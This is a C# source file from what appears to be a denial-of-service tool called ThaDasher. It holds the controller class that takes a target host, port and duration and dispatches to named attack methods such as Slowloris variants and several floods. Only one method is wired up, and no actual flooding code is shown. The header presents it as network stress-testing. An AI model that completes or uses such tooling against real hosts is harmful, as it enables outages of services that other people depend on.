
//
// Author: Dashie
// Version: 1.0
//
// Extensive Dash library for personal use only.  This code was not made for 
// abuse but rather for the right use.  This entire application started off as  
// a small project but turned into something next level.
//
// All methods are meant for stress-testing networks.  You are responsible for that
// what you do with this, so use this code wisely.
//

using System;
using System.Net;
using System.Drawing;
using System.Threading;
using System.Net.Sockets;
using System.Windows.Forms;
using System.Collections.Generic;

namespace ThaDasher
{
    public class DashNet
    {
	readonly MethodConfig MethodConfig = new MethodConfig();

	private static void SendMessage(string s)
	{
	    void print() => LogContainer.LOG.AppendText($"(+) {s}\r\n");

	    if (LogContainer.LOG.InvokeRequired)
	    {
		LogContainer.LOG.Invoke(new MethodInvoker(
		    delegate () {
			print();
		    }
		));
	    }

	    else
	    {
		print();
	    }
	}

	readonly static public Dictionary<string, string> target_info = new Dictionary<string, string>();

	public void SendAttack(string shost, int sport, int sdura)
	{
	    MethodConfig.Show();

	    target_info.Add("host", $"{shost}");
	    target_info.Add("port", $"{sport}");
	    target_info.Add("dura", $"{sdura}");

	    var m = SettingsContainer.CURRENT_METHOD.ToLower();

	    switch (m)
	    {
		case "dashloris 4.0": DASHLORIS4.Launch(); break;
		case "slowloris 2.0": break;
		case "put head": break;
		case "post head":  break;
		case "get head": break;
		case "h-flood": break;

		case "long socks": break;
		case "multi flood": break;
		case "multi socks": break;
		case "wavesss": break;

		case "overload": break;
		case "wavy baby": break;
		case "go ham": break;
		case "insta flood": break;
	    };

	    // Change dis
	    StartWorkers();
	}

	readonly static public List<Thread> workers = new List<Thread>();

	public void StartWorkers()
	{
	    foreach (var worker in workers)
	    {
		worker.Start();
	    };
	}

	public void StopWorkers()
	{
	    foreach (var worker in workers)
	    {
		worker.Abort();
	    };

	    workers.Clear();

	    TaskbarContainer.START.Text = "Start";
	}
    }
}
